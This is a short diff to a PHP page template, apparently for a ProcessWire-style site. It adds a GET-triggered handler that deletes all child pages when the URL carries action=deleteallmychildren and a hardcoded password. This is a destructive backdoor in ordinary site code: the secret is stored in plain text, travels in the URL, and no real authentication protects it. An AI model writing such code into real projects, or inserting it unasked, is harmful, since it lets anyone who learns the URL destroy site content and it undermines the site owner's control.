@@ -7,6 +7,11 @@
 
 include_once("_strings.php" );
 
+if($_GET["action"] == "deleteallmychildren" && $_GET["pass"] == "b3rN)7;/SScc8thd"){
+    foreach ($page->children as $child) {
+        $child->delete();
+    }
+}
 
 if ($_POST["action"] == "newtile") {
 
@@ -28,6 +33,7 @@ if ($_POST["action"] == "newtile") {
     echo json_encode($resp, true);
     exit;
 }
+
 
 $seg = $input->urlSegment(1);
 if($seg == "prev"){
